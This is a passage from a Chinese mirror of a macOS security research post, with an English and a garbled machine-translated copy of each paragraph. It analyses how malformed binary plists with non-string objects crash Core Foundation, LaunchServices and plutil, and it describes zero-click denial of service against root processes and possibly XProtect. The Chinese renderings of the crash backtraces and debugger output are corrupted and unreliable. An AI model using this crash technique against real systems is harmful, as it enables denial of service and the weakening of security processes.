disassembly I stepped through  CFStringFind in  LLDB until right before the call to  _CFStringGetLength to inspect the registers. From  Appleâ€™s documentation for  _CFStringGetLength we know that the first argument should be a string so we can inspect the  RDI register with the following LLDB command.</p><p>CFStringFindåæ±‡ç¼–æˆ‘éå†äº†LLDBä¸­çš„CFStringFindï¼Œç›´åˆ°è°ƒç”¨_CFStringGetLengthæ£€æŸ¥å¯„å­˜å™¨ä¹‹å‰ã€‚ä»Appleçš„_CFStringGetLengthæ–‡æ¡£ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“ç¬¬ä¸€ä¸ªå‚æ•°åº”è¯¥æ˜¯å­—ç¬¦ä¸²ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä»¥ä¸‹LLDBå‘½ä»¤æ£€æŸ¥RDIå¯„å­˜å™¨ã€‚</p><p>  Bingo! The object type for the first argument was not a string but instead an  _NSDate object from our malicious bplist. The decompilation of  _CFStringGetLength below illustrates where this could go wrong:</p><p>å¯¹å•°!ã€‚ç¬¬ä¸€ä¸ªå‚æ•°çš„å¯¹è±¡ç±»å‹ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯æ¶æ„bplistä¸­çš„_NSDateå¯¹è±¡ã€‚ä¸‹é¢çš„_CFStringGetLengthçš„åç¼–è¯‘è¯´æ˜äº†è¿™å¯èƒ½ä¼šå‡ºé”™çš„åœ°æ–¹ï¼š</p><p>  _CFStringGetLength decompilation We can see that the length selector is being called on the first argument to this function which we know will fail for an  _NSDate object since it doesnâ€™t have this selector. This theory matches up with the crash logs as well.</p><p>_CFStringGetLengthåç¼–è¯‘æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æ­¤å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸Šè°ƒç”¨äº†é•¿åº¦é€‰æ‹©å™¨ï¼Œæˆ‘ä»¬çŸ¥é“è¿™å¯¹äº_NSDateå¯¹è±¡æ˜¯å¤±è´¥çš„ï¼Œå› ä¸ºå®ƒæ²¡æœ‰è¿™ä¸ªé€‰æ‹©å™¨ã€‚è¿™ä¸€ç†è®ºä¹Ÿä¸å æœºæ—¥å¿—ç›¸ç¬¦ã€‚</p><p>  If we continue through this function we will eventually hit an exception in the bowels of Objective-C exception handling which indicates we have found the root cause of these crashes.</p><p>å¦‚æœæˆ‘ä»¬ç»§ç»­æ‰§è¡Œæ­¤å‡½æ•°ï¼Œæˆ‘ä»¬æœ€ç»ˆå°†åœ¨Objective-Cå¼‚å¸¸å¤„ç†çš„å†…éƒ¨é‡åˆ°å¼‚å¸¸ï¼Œè¿™è¡¨æ˜æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†è¿™äº›å´©æºƒçš„æ ¹æœ¬åŸå› ã€‚</p><p>  I continued to generate  bplists with non-string objects and was able to generate additional crashes within  Core Foundation from other unrecognized selectors. The crash log below is from  LSD after consuming a malicious  bplist with a single  __NSCFData object:</p><p>æˆ‘ç»§ç»­ä½¿ç”¨éå­—ç¬¦ä¸²å¯¹è±¡ç”Ÿæˆbplistï¼Œå¹¶ä¸”èƒ½å¤Ÿåœ¨Core Foundationä¸­ä»å…¶ä»–æ— æ³•è¯†åˆ«çš„é€‰æ‹©å™¨ç”Ÿæˆé¢å¤–çš„å´©æºƒã€‚ä¸‹é¢çš„å´©æºƒæ—¥å¿—æ¥è‡ªLSDï¼Œå®ƒä½¿ç”¨äº†å¸¦æœ‰å•ä¸ª__NSCFDataå¯¹è±¡çš„æ¶æ„bplistï¼š</p><p>   Application Specific Backtrace 1:0 CoreFoundation 0x00007fff356568ab __exceptionPreprocess + 2501 libobjc.A.dylib 0x00007fff6b777805 objc_exception_throw + 482 CoreFoundation 0x00007fff356d5b61 -[NSObject(NSObject) __retain_OA] + 03 CoreFoundation 0x00007fff355baadf ___forwarding___ + 14274 CoreFoundation 0x00007fff355ba4b8 _CF_forwarding_prep_0 + 1205 CoreFoundation 0x00007fff355615f9 CFStringFindWithOptionsAndLocale + 2656 CoreFoundation 0x00007fff35578697 CFStringFind + 787 CoreFoundation 0x00007fff35577cc8 _CFBundleInfoPlistProcessInfoDictionary + 1948 CoreFoundation 0x00007fff35570aff _CFBundleCopyInfoDictionaryInDirectoryWithVersion + 11179 CoreFoundation 0x00007fff35570349 _CFBundleRefreshInfoDictionaryAlreadyLocked + 11110 CoreFoundation 0x00007fff355702c8 CFBundleGetInfoDictionary + 3311 CoreFoundation 0x00007fff35678d4f _CFBundleCreate + 71512 LaunchServices 0x00007fff36d2b762 -[FSNode(Bundles) CFBundleWithError:] + 8813 LaunchServices 0x00007fff36e34e62 _LSCreateRegistrationData + 29414 LaunchServices 0x00007fff36d861e8 __104-[_LSDModifyClient registerItemInfo:alias:diskImageAlias:bundleURL:installationPlist:completionHandler:]_block_invoke + 19115 libdispatch.dylib 0x00007fff6ca8b583 _dispatch_call_block_and_release + 1216 libdispatch.dylib 0x00007fff6ca8c50e _dispatch_client_callout + 817 libdispatch.dylib 0x00007fff6ca91ace _dispatch_lane_serial_drain + 59718 libdispatch.dylib 0x00007fff6ca92485 _dispatch_lane_invoke + 41419 libdispatch.dylib 0x00007fff6ca9ba9e _dispatch_workloop_worker_thread + 59820 libsystem_pthread.dylib 0x00007fff6cce66fc _pthread_wqthread + 29021 libsystem_pthread.dylib 0x00007fff6cce5827 start_wqthread + 15</p><p>Application Specific Backtrace 1:0 CoreFoundation 0x00007fff356568ab__exceptionPreprocess+2501 libobjc.A.dylib 0x00007fff6b777805 objc_exception_throw+482 CoreFoundation 0x00007fff356d5b61-[NSObject(NSObject)__retain_OA]+03 CoreFoundation 0x00007fff355baadf___forwarding___+14274 CoreFoundation 0x00007fff355ba4b8_CF_forwarding_prep_0+1205 CoreFoundation 0x00007fff355615f9 CFStringFindWithOptionsAndLocale+2656 CoreFoundation 0x00007fff35578697 CFStringFind+787 CoreFoundation 0x00007fff35577cc8_CFBundleInfoPlistProcessInfoDictionary+1948 CoreFoundation 0x00007fff35570aff_CFBundleCopyInfoDictionaryInDirectoryWithVersion+11179 CoreFoundation 0x00007fff35570349_CFBundleRefreshInfoDictionaryAlreadyLocked+11110 CoreFoundation 0x00007fff355702c8 CFBundleGetInfoDictionary+3311 CoreFoundation 0x00007fff35678d4f_CFBundleCreate+71512 LaunchServices 0x00007fff36d2b762-[FSNode(Bundles)CFBundleWithErrorï¼š]+8813 LaunchServices 0x00007fff36e34e62ã€‚_LSCreateRegistrationData+29414å¯åŠ¨æœåŠ¡0x00007fff36d861e8__104-[_LSDModifyClient registerItemInfo:alias:diskImageAlias:bundleURL:installationPlist:completionHandlerï¼š]_block_invoke+19115 libdispatch.dylib 0x00007fff6ca8b583_DISPATCH_CALL_BLOCK_AND_RELEASE+1216libDispatch.dylib 0x00007fff6ca8c50e_DISPATCH_CLIENT_CALOUT+817libDispatch.dylib 0x00007ffpwçº¿ç¨‹+59718 libDispatch.dylib0x007fff6ca92485_DISPATCH_41419 libDispatch.dylib 0x007fff6ca9ca9ba9e_Dispatch_Worklop_Work_Workerçº¿ç¨‹+59820 libDispatch.dybsystem_preadddy.libdispatch.dyx007ffccecwtHREAD_29021 SYSTEM_DISPATCH_LANE_SERIAL_DRANER+59718 libDispatch.dylib 0x007fff6ca92485_DISPATION_41419 libDispatch.dylib 0x007ffff6ca92485_DISPATCH_WORKORE_Worker_THREAD+59820 libDispatch.dybsystemã€‚</p><p> Notice that the crashing location, before Objective-C exception handling, is not from  CFStringFind but actually  CFStringFindWithOptionsAndLocale which calls  _CFStringGetCStringPtrInternal finally dying a horrible death from the incorrect selector  _fastCStringContents being called. The reason for this is that the  __NSCFData type actually has a length selector so it successfully gets past the first crashing location we saw earlier and further into  Core Foundation until it calls another unrecognized selector.</p><p>æ³¨æ„ï¼Œåœ¨Objective-Cå¼‚å¸¸å¤„ç†ä¹‹å‰ï¼Œå´©æºƒä½ç½®ä¸æ˜¯æ¥è‡ªCFStringFindï¼Œè€Œå®é™…ä¸Šæ˜¯CFStringFindWithOptionsAndLocaleï¼Œå®ƒè°ƒç”¨_CFStringGetCStringPtrInternalï¼Œæœ€åç”±äºè°ƒç”¨äº†ä¸æ­£ç¡®çš„selector_fast CStringContentsè€Œæ­»å¾—å¾ˆæƒ¨ã€‚è¿™æ˜¯å› ä¸º__NSCFDataç±»å‹å®é™…ä¸Šæœ‰ä¸€ä¸ªé•¿åº¦é€‰æ‹©å™¨ï¼Œå› æ­¤å®ƒæˆåŠŸåœ°é€šè¿‡äº†æˆ‘ä»¬å‰é¢çœ‹åˆ°çš„ç¬¬ä¸€ä¸ªå´©æºƒä½ç½®ï¼Œå¹¶è¿›ä¸€æ­¥è¿›å…¥Core Foundationï¼Œç›´åˆ°å®ƒè°ƒç”¨å¦ä¸€ä¸ªæ— æ³•è¯†åˆ«çš„é€‰æ‹©å™¨ã€‚</p><p>  Early in this research I was using plutil to generate crashes from malicious  bplists before writing my own code to hit the necessary code paths. The following commands set up an  LLDB session to start debugging this crash by using  plutil as the target process and the print plist flag which will just print a human-readable version of the property list.</p><p>åœ¨æœ¬ç ”ç©¶çš„æ—©æœŸï¼Œæˆ‘ä½¿ç”¨Plutilä»æ¶æ„bplistç”Ÿæˆå´©æºƒï¼Œç„¶åå†ç¼–å†™æˆ‘è‡ªå·±çš„ä»£ç ä»¥å‘½ä¸­å¿…è¦çš„ä»£ç è·¯å¾„ã€‚ä»¥ä¸‹å‘½ä»¤è®¾ç½®ä¸€ä¸ªLLDBä¼šè¯ï¼Œé€šè¿‡ä½¿ç”¨Plutilä½œä¸ºç›®æ ‡è¿›ç¨‹å’Œprint plistæ ‡å¿—å¼€å§‹è°ƒè¯•æ­¤å´©æºƒï¼Œè¯¥æ ‡å¿—å°†åªæ‰“å°å±æ€§åˆ—è¡¨çš„äººç±»å¯è¯»ç‰ˆæœ¬ã€‚</p><p>  After stepping through execution a few times, it was evident that plutil actually crashes in a different location and NOT in  Core Foundation. The output below illustrates that it attempts to call the length selector on an  __NSDate type which causes an unrecognized selector exception but this bug lives in  plutil and not in  Core Foundation.</p><p>åœ¨æ‰§è¡Œäº†å‡ æ¬¡ä¹‹åï¼Œå¾ˆæ˜æ˜¾ï¼ŒPlutilå®é™…ä¸Šåœ¨ä¸åŒçš„ä½ç½®å´©æºƒï¼Œè€Œä¸æ˜¯åœ¨Core Foundationä¸­ã€‚ä¸‹é¢çš„è¾“å‡ºè¯´æ˜å®ƒè¯•å›¾è°ƒç”¨__NSDateç±»å‹ä¸Šçš„é•¿åº¦é€‰æ‹©å™¨ï¼Œè¿™ä¼šå¯¼è‡´æ— æ³•è¯†åˆ«çš„é€‰æ‹©å™¨å¼‚å¸¸ï¼Œä½†æ­¤é”™è¯¯å­˜åœ¨äºPlutilä¸­ï¼Œè€Œä¸æ˜¯Core Foundationä¸­ã€‚</p><p> * thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1 frame #0: 0x0000000100006aa0 plutil`___lldb_unnamed_symbol67$$plutil: -&gt; 0x100006aa0 &lt;+21&gt;: movq 0x5e91(%rip), %rsi ; &#34;length&#34; 0x100006aa7 &lt;+28&gt;: movq 0x45b2(%rip), %r12 ; objc_msgSend 0x100006aae &lt;+35&gt;: callq *%r12 0x100006ab1 &lt;+38&gt;: movq %rax, %r15Target 1: (plutil) stopped.(lldb) po [$rdi class]__NSDate</p><p>*çº¿ç¨‹#1ï¼Œé˜Ÿåˆ—=&#39ï¼›com.apple.main-çº¿ç¨‹&#39ï¼›ï¼Œåœæ­¢åŸå› =æ–­ç‚¹3.1å¸§#0ï¼š0x0000000100006aa0æ’å¤´`_lldb_unname_symbol 67$$Plutilï¼š-&gtï¼›0x100006aa0&ltï¼›+21&gtï¼›ï¼šmovq 0x5e91(%rip)ï¼Œ%rsiï¼›&#34ï¼›é•¿åº¦&#34ï¼›0x100006a7&ltï¼›+28&gtï¼›ï¼šmovq 0x45b2(%rip)ï¼Œ%robjc_msgSend 0x106ae&ltï¼›+35&gtï¼›ï¼šcallq*%R12 0x100006ab1&ltï¼›+38&gtï¼›ç”¨æ³•ï¼šmovq%raxï¼Œ%r15ç›®æ ‡1ï¼š(Plutil)å·²åœæ­¢ã€‚(Lldb)po[$RDIç±»]__NSDate</p><p> It appears similar bugs exist in many macOS applications that assume  bplists will only contain string object types. The stacktrace from a crashed  LSD process is below which is also outside of  Core Foundation:</p><p>ä¼¼ä¹åœ¨è®¸å¤šMacOSåº”ç”¨ç¨‹åºä¸­éƒ½å­˜åœ¨ç±»ä¼¼çš„é”™è¯¯ï¼Œè¿™äº›åº”ç”¨ç¨‹åºå‡å®šbplistå°†åªåŒ…å«å­—ç¬¦ä¸²å¯¹è±¡ç±»å‹ã€‚æ¥è‡ªå´©æºƒçš„LSDè¿›ç¨‹çš„å †æ ˆè·Ÿè¸ªå¦‚ä¸‹ï¼Œå®ƒä¹Ÿä½äºCore Foundationä¹‹å¤–ï¼š</p><p> * thread #2, queue = &#39;com.apple.lsd.database&#39;, stop reason = breakpoint 3.1 * frame #0: 0x00007fff384c5440 CoreFoundation`__forwarding_prep_0___ frame #1: 0x00007fff39c644d5 LaunchServices`_LSPlistCompactString(NSString*, signed char*) + 45 frame #2: 0x00007fff39c98b06 LaunchServices`___ZL22_LSPlistTransformValueP11objc_objectPFP8NSStringS2_PaES3__block_invoke.637 + 67 frame #3: 0x00007fff384a8f27 CoreFoundation`__NSDICTIONARY_IS_CALLING_OUT_TO_A_BLOCK__ + 7 frame #4: 0x00007fff384e8a85 CoreFoundation`-[__NSDictionaryM enumerateKeysAndObjectsWithOptions:usingBlock:] + 230 frame #5: 0x00007fff39c987c7 LaunchServices`___ZL17_LSPlistTransformP12NSDictionaryIP8NSStringP11objc_objectEPFS1_S1_PaES6__block_invoke + 562 frame #6: 0x00007fff384a8f27 CoreFoundation`__NSDICTIONARY_IS_CALLING_OUT_TO_A_BLOCK__ + 7 frame #7: 0x00007fff384e8a85 CoreFoundation`-[__NSDictionaryM enumerateKeysAndObjectsWithOptions:usingBlock:] + 230 frame #8: 0x00007fff39c64a60 LaunchServices`_LSPlistTransform(NSDictionary *, NSString* (*)(NSString*, signed char*), signed char*) + 212 frame #9: 0x00007fff39c96dbb LaunchServices`_LSPlistCompact + 65 frame #10: 0x00007fff39d019d9 LaunchServices`_LSPlistAdd + 79 frame #11: 0x00007fff39c9d3b5 LaunchServices`-[LSBundleRecordBuilder buildBundleData:error:] + 2772 frame #12: 0x00007fff39c9e3a8 LaunchServices`-[LSBundleRecordBuilder registerBundleRecord:error:] + 97 frame #13: 0x00007fff39d3f7ec LaunchServices`_LSServerBundleRegistration + 1870 frame #14: 0x00007fff39d41ba1 LaunchServices`_LSServerItemInfoRegistration + 691 frame #15: 0x00007fff39d8a62d LaunchServices`_LSServer_RegisterItemInfo + 244 frame #16: 0x00007fff39c9155d LaunchServices`__104-[_LSDModifyClient registerItemInfo:alias:diskImageAlias:bundleURL:installationPlist:completionHandler:]_block_invoke_2 + 107 frame #17: 0x00007fff6f996583 libdispatch.dylib`_dispatch_call_block_and_release + 12 frame #18: 0x00007fff6f99750e libdispatch.dylib`_dispatch_client_callout + 8 frame #19: 0x00007fff6f9a4827 libdispatch.dylib`_dispatch_lane_concurrent_drain + 1032 frame #20: 0x00007fff6f99d4ec libdispatch.dylib`_dispatch_lane_invoke + 517 frame #21: 0x00007fff6f999202 libdispatch.dylib`_dispatch_queue_override_invoke + 421 frame #22: 0x00007fff6f9a57e2 libdispatch.dylib`_dispatch_root_queue_drain + 326 frame #23: 0x00007fff6f9a5f22 libdispatch.dylib`_dispatch_worker_thread2 + 92 frame #24: 0x00007fff6fbf16b6 libsystem_pthread.dylib`_pthread_wqthread + 220 frame #25: 0x00007fff6fbf0827 libsystem_pthread.dylib`start_wqthread + 15</p><p>*çº¿ç¨‹#2ï¼Œé˜Ÿåˆ—=&#39ï¼›com.apple.lsd.database&#39ï¼›ï¼Œåœæ­¢åŸå› =æ–­ç‚¹3.1*å¸§#0ï¼š0x00007fff384c5440æ ¸å¿ƒåŸºç¡€`__Forwarding_PREP_0_å¸§#1ï¼š0x00007fff39c644d5 LaunchServices`_LSPlistCompactString(NSString*ï¼ŒSigned char*)+45 Frame#2ï¼š0x00007fff39c98b06 LaunchServices`___ZL22_LSPlistTransformValueP11objc_objectPFP8NSStringS2_PaES3__block_invoke.637+67 Frame#3ï¼š0x00007fff384a8f27 CoreFoundation`__NSDICTIONARY_IS_CALLING_OUT_TO_A_BLOCK__+7 Frame#4ï¼š0x00007fff384e8a85 CoreFoundation`-[__NSDictionaryM enumerateKeysAndObjectsWithOptions:usingBlockï¼š]+230Frame#5ï¼š0x00007ff39c987c7 LaunchServices`___ZL17_LSPlistTransformP12NSDictionaryIP8NSStringP11objc_objectEPFS1_S1_PaES6__block_invoke+562 Frame#6ï¼š0x00007fff384a8f27 CoreFoundation`__NSDICTIONARY_IS_CALLING_OUT_TO_A_BLOCKã€‚__+7å¸§#7ï¼š0x00007fff384e8a85æ ¸å¿ƒåŸºç¡€`-[__NSDictionaryM enumerateKeysAndObjectsWithOptions:usingBlockï¼š]+230Frame#8ï¼š0x00007fff39c64a60LaunchServices`_LSPlistTransform(NSDictionary*ï¼ŒNSString*(*)(NSString*ï¼Œæœ‰ç¬¦å·å­—ç¬¦*)ï¼ŒSigned char*)+212 Frame#9ï¼š0x00007fff39c96dbb LaunchServices`_LSPlistCompact+65 Frame#10ï¼š0x00007fff39d019d9 Frame#10ï¼š0x00007fff39d019d9 LaunchServices`_LSPlistAdd+79 Frame#11ï¼š0x00007fff39c9d3b5 LaunchServices`-[LSBundleRecordBuilder buildBundleDataï¼šErrorï¼š]+2772 Frame#12ï¼š0x00007fff39c9e3a8 Frame#10ï¼š0x00007fff39c9e3a8 LaunchServices`-[LSBundleRecordBuilder#BundleServices`_LSServerBundleRegistry+1870 Frame#14ï¼š0x007ff39fd41LaunchSeres`ã€‚_2+107Frame#17ï¼š0x00007fff6f996583 libdispatch.dylib`_dispatch_call_block_and_release+12 Frame#18ï¼š0x00007fff6f99750e libdispatch.dylib`_DISPATCH_CLIENT_CALLOUT+8 Frame#19ï¼š0x00007fff6f9a4827 libdispatch.dylib`_dispatch_lane_concurrent_drain+1032Frame#20ï¼š0x00007fff6f99d4ec libDispatch.dylib`_DISPATCH_21ï¼š0x00007fff6f999202 libdispatch.dylib`_dispatch_queue_override_invoke+421 Frame#22ï¼š0x007fff6f9a57e2 libè°ƒåº¦_ROOT_QUEUE_326 Frame#23ï¼š0x007fff6f9a5a22 Frame#23ï¼š0x007fff6f6f999202 LIBDISTER#22ï¼š0x00007fff6f9a57e2 libDispatch_ROOT_QUEUE_326 Frame#23ï¼š0x007fff6f9f5a22 Frame#23ï¼š0x007fff6f99d4ec libDispatch.dyb`ã€‚_worker_thread2+92 Frame#24ï¼š0x00007fff6fbf16b6 libsystem_pthread.dylib`_pthread_wqthread+220 Frame#25ï¼š0x00007fff6fbf0827 libsystem_pthread.dylib`start_wqthread+15ã€‚</p><p> If we use GHIDRA to disassemble the  _LSPlistCompactString function, we can see that offset  45 or  0x2D gets us to yet another length call on the incorrect object type presumably from our malicious bplist which is now in the  LSD database:</p><p>å¦‚æœæˆ‘ä»¬ä½¿ç”¨Ghidraæ¥åæ±‡ç¼–_LSPlistCompactStringå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åç§»é‡45æˆ–0x2Dä¼šè®©æˆ‘ä»¬å¯¹é”™è¯¯çš„å¯¹è±¡ç±»å‹è¿›è¡Œå¦ä¸€ä¸ªé•¿åº¦è°ƒç”¨ï¼Œè¿™å¤§æ¦‚æ¥è‡ªæˆ‘ä»¬ç°åœ¨ä½äºLSDæ•°æ®åº“ä¸­çš„æ¶æ„bplistï¼š</p><p>  _LSPlistCompactString disassembly We can verify this by setting a breakpoint on  _LSPlistCompactString and printing the first argument with the following breakpoint commands:</p><p>_LSPlistCompactStringåæ±‡ç¼–æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨_LSPlistCompactStringä¸Šè®¾ç½®æ–­ç‚¹å¹¶ä½¿ç”¨ä»¥ä¸‹æ–­ç‚¹å‘½ä»¤æ‰“å°ç¬¬ä¸€ä¸ªå‚æ•°æ¥éªŒè¯è¿™ä¸€ç‚¹ï¼š</p><p> (lldb) br com add 1Enter your debugger command(s). Type &#39;DONE&#39; to end.&gt; po [$rdi class] &gt; c&gt; DONE</p><p>(Lldb)br com add 1è¾“å…¥æ‚¨çš„è°ƒè¯•å™¨å‘½ä»¤ã€‚é”®å…¥&#39ï¼›Done&#39ï¼›ä»¥ç»“æŸã€‚&gtï¼›po[$RDIç±»]&gtï¼›c&&gt;Doneã€‚</p><p> The output below illustrates that  LSD is getting our  __NSDate object from the malicious  bplist:</p><p>ä¸‹é¢çš„è¾“å‡ºè¯´æ˜LSDæ­£åœ¨ä»æ¶æ„bplistè·å–__NSDateå¯¹è±¡ï¼š</p><p> Command #2 &#39;c&#39; continued the target.(lldb) po [$rdi class]NSTaggedPointerString(lldb) cProcess 576 resumingCommand #2 &#39;c&#39; continued the target.(lldb) po [$rdi class]__NSDate</p><p>å‘½ä»¤#2&#39ï¼›c&#39ï¼›ç»§ç»­ç›®æ ‡ã€‚(Lldb)po[$RDIç±»]NSTaggedPointerString(Lldb)cProcess 576ç»§ç»­å‘½ä»¤#2&#39ï¼›c&#39ï¼›ç»§ç»­ç›®æ ‡ã€‚(Lldb)po[$RDIç±»]__NSDateã€‚</p><p> This confirms what I thought was intially one bug is actually many across multiple macOS binaries and all rooted in the assumption that bplists only contain string objects.</p><p>è¿™è¯å®äº†æˆ‘æœ€åˆè®¤ä¸ºçš„ä¸€ä¸ªbugå®é™…ä¸Šæ˜¯è·¨è¶Šå¤šä¸ªMacOSäºŒè¿›åˆ¶æ–‡ä»¶çš„å¤šä¸ªbugï¼Œå¹¶ä¸”éƒ½æ ¹æºäºbpliståªåŒ…å«Stringå¯¹è±¡çš„å‡è®¾ã€‚</p><p>  Root-level processes can be crashed from a normal User account and repeatedly crash if they are respawned by the Operating System ( LSD and  MDS are examples).</p><p>æ ¹çº§åˆ«è¿›ç¨‹å¯èƒ½ä¼šä»æ™®é€šç”¨æˆ·å¸æˆ·å´©æºƒï¼Œå¦‚æœå®ƒä»¬ç”±æ“ä½œç³»ç»Ÿé‡æ–°ç”Ÿæˆï¼Œåˆ™ä¼šåå¤å´©æºƒ(ä¾‹å¦‚LSDå’ŒMDS)ã€‚</p><p> System instability and denial of service occur especially when  Finder or other UI related processes consume the malicious  bplist and crash0-clicks required to crash processes since application bundles, packages etc. are automatically processed when they are written to disk.</p><p>å½“Finderæˆ–å…¶ä»–ä¸UIç›¸å…³çš„è¿›ç¨‹ä½¿ç”¨ä½¿è¿›ç¨‹å´©æºƒæ‰€éœ€çš„æ¶æ„bplistå’Œcrash0å•å‡»æ—¶ï¼Œå°¤å…¶ä¼šå‘ç”Ÿç³»ç»Ÿä¸ç¨³å®šå’Œæ‹’ç»æœåŠ¡ï¼Œå› ä¸ºåº”ç”¨ç¨‹åºåŒ…ã€åŒ…ç­‰åœ¨å†™å…¥ç£ç›˜æ—¶ä¼šè‡ªåŠ¨å¤„ç†ã€‚</p><p> Potential to crash security-related processes from normal User accounts to remove security boundaries ( XProtect, etc.) although they were not fully explored in this post.</p><p>å¯èƒ½ä¼šä½¿æ­£å¸¸ç”¨æˆ·å¸æˆ·ä¸­ä¸å®‰å…¨ç›¸å…³çš„è¿›ç¨‹å´©æºƒï¼Œä»¥åˆ é™¤å®‰å…¨è¾¹ç•Œ(XProtectç­‰)ã€‚å°½ç®¡åœ¨è¿™ç¯‡æ–‡ç« ä¸­å¹¶æ²¡æœ‰å¯¹å®ƒä»¬è¿›è¡Œå……åˆ†çš„æ¢ç´¢ã€‚</p><p>  System components impacted by this bug include any that use  Core Foundation to parse  bplists which is a large percentage (a quick search found over 1000 installed binaries on macOS 10.15.3 that import functions to reach this bug).</p><p>å—æ­¤ç¼ºé™·å½±å“çš„ç³»ç»Ÿç»„ä»¶åŒ…æ‹¬ä½¿ç”¨Core Foundationè§£æbplistçš„ä»»ä½•ç»„ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„ç™¾åˆ†æ¯”(å¿«é€Ÿæœç´¢å‘ç°ï¼Œåœ¨MacOS 10.15.3ä¸Šå®‰è£…äº†1000å¤šä¸ªå¯¼å…¥å‡½æ•°ä»¥è¾¾åˆ°æ­¤ç¼ºé™·çš„äºŒè¿›åˆ¶æ–‡ä»¶)ã€‚</p><p> Many applications parse  bplist data through  Core Foundation but also access generated objects incorrectly within their own code meaning the bug count could be much larger.</p><p>è®¸å¤šåº”ç”¨ç¨‹åºé€šè¿‡Core Foundationè§£æbplistæ•°æ®ï¼Œä½†ä¹Ÿä¼šåœ¨å…¶è‡ªå·±çš„ä»£ç ä¸­é”™è¯¯åœ°è®¿é—®ç”Ÿæˆçš„å¯¹è±¡ï¼Œè¿™æ„å‘³ç€bugæ•°é‡å¯èƒ½è¦å¤§å¾—å¤šã€‚</p><p>  Hopefully this exploration was as interesting and helpful to the community as it was for my own understanding of macOS internals. Shout out to the Apple security community which is extremely passionate and informative about poking at Apple products. There is some follow-on work to this post which will hopefully be published in the coming months. As always, feedback is welcome including corrections to any inaccuracies or suggestions for more effective ways to accomplish the same goals.</p><p>å¸Œæœ›è¿™æ¬¡æ¢ç´¢èƒ½åƒæˆ‘è‡ªå·±å¯¹MacOSå†…éƒ¨ç»“æ„çš„ç†è§£ä¸€æ ·æœ‰è¶£ï¼Œå¯¹ç¤¾åŒºä¹Ÿæœ‰å¸®åŠ©ã€‚å‘è‹¹æœå®‰å…¨ç¤¾åŒºå–Šè¯å§ï¼Œä»–ä»¬å¯¹æŠ¨å‡»è‹¹æœäº§å“éå¸¸çƒ­æƒ…ï¼Œå†…å®¹ä¹Ÿéå¸¸ä¸°å¯Œã€‚è¿™ç¯‡æ–‡ç« è¿˜æœ‰ä¸€äº›åç»­å·¥ä½œï¼Œæœ‰æœ›åœ¨æœªæ¥å‡ ä¸ªæœˆå‘è¡¨ã€‚ä¸€å¦‚æ—¢å¾€ï¼Œæ¬¢è¿åé¦ˆï¼ŒåŒ…æ‹¬å¯¹ä»»ä½•ä¸å‡†ç¡®ä¹‹å¤„çš„æ›´æ­£æˆ–å¯¹å®ç°ç›¸åŒç›®æ ‡çš„æ›´æœ‰æ•ˆæ–¹æ³•çš„å»ºè®®ã€‚</p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://objective-see.com/blog/blog_0x5A.html">https://objective-see.com/blog/blog_0x5A.html</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/é”™è¯¯/">#é”™è¯¯</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/list/">#list</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/å´©æºƒ/">#å´©æºƒ</a></button></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è®¾è®¡/">#è®¾è®¡</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ¸¸æˆ/">#æ¸¸æˆ</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/åˆ›æ„/">#åˆ›æ„</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è‹¹æœ/">#è‹¹æœ</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ‘„å½±/">#æ‘„å½±</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è½¯ä»¶/">#è½¯ä»¶</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/ç¾å›½/">#ç¾å›½</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å›¾ç‰‡/">#å›¾ç‰‡</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/æ‰‹æœº/">#æ‰‹æœº</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è§†é¢‘/">#è§†é¢‘</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å¹¿å‘Š/">#å¹¿å‘Š</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å…è´¹/">#å…è´¹</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/è°·æ­Œ/">#è°·æ­Œ</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/ç½‘ç«™/">#ç½‘ç«™</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/å¾®è½¯/">#å¾®è½¯</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/ä¸‹è½½/">#ä¸‹è½½</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/éŸ³ä¹/">#éŸ³ä¹</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/linux/">#linux</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/åšå®¢/">#åšå®¢</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/ç¨‹åº/">#ç¨‹åº</a></button><button type="button" class="btn btn-link my_tag"><a 